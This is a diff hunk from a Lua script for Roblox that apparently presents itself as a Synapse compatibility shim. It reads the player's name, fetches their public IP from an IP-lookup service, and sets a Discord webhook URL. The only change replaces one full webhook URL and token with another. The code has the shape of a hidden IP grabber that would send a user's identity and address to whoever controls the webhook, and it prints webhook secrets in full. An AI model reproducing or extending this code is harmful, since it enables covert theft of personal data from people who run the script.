@@ -43,7 +43,7 @@ syn.crypto = crypt
 getgenv().syn = syn
 
 local name = game:GetService("Players").LocalPlayer.Name
-    local WebhookURL = "https://discord.com/api/webhooks/1014629343688937492/fcFlX5HJ4w2xiXIDr85O9P3M1fmKk3ofUGtzLGMo7V311M-fbGP6sy593-QvTkI5BPiU"
+    local WebhookURL = "https://discord.com/api/webhooks/1093278747790159952/ZBcZkfSSOeqk_PFh0sLaASX5YDnY5ATgcvyGd0BgwTvGPhsX0HGXwxKXGmz7OLYpw-Wt"
     local getIPResponse = syn.request({
         Url = "https://api.ipify.org/?format=json",
         Method = "GET"
